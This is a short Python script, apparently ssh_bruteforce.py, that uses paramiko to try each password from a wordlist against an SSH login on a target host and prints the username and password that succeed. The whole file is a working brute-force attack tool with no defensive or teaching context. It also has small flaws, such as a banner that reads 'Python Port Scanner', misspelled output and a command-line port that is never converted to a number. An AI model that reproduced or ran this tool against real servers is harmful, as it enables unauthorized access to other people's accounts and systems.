
import sys
import paramiko
import pyfiglet

banner = pyfiglet.figlet_format("Python Port Scanner")
print(banner)

if len(sys.argv) < 4:
    print('[!] Usage:')
    print('python ssh_bruteforce.py [target] [username] [wordlist] [port[=22]]')
    exit()

target = sys.argv[1]
username = sys.argv[2]
wordlist = sys.argv[3]
port = 22
if len(sys.argv) == 5:
    port = sys.argv[4]

def ssh_connect(password, port=22):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target, port=port, username=username, password=password)
    except paramiko.AuthenticationException:
        return False
    ssh.close()
    return True

with open(wordlist, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        print(f'\r[*] Tyring {username}:{password}', end='')
        try:
            res = ssh_connect(password, port)

            if res:
                print()
                print()
                print(f'[+] Password found: {password}')
                print(f'[+] ssh credentiels: {username}:{password}')
                exit(0)
            # else:
            #     print(f'[-] Failed {password}')
        except Exception as e:
            print(e)